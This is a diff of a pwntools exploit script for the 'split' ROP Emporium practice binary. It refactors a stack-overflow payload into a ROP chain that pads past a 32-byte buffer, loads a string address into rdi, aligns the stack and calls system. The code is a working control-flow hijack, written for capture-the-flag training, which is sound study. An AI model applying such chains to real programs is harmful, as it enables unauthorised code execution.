@@ -1,7 +1,6 @@
 from pwn import *
 
 elf = ELF("split")
-rop = ROP(elf)
 
 context.binary = elf
 context.terminal = ['konsole', '-e']
@@ -21,17 +20,15 @@ def connection():
     return c
 
 BUFFER_SIZE = 32
+READ_SIZE = 96
 
 def main():
-    payload = flat \
-    ({
-        BUFFER_SIZE + context.bytes: \
-        [
-            rop.rdi.address, elf.symbols.usefulString,
-            rop.find_gadget(['ret']).address,
-            elf.symbols.system
-        ]
-    })
+    rop = ROP(elf)
+    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
+    rop(rdi=elf.symbols.usefulString)
+    rop.raw([rop.ret.address, elf.symbols.system]) # stack alignment
+    payload = rop.chain()
+    assert len(payload) <= READ_SIZE
 
     c = connection()
     c.sendlineafter(b'> ', payload)
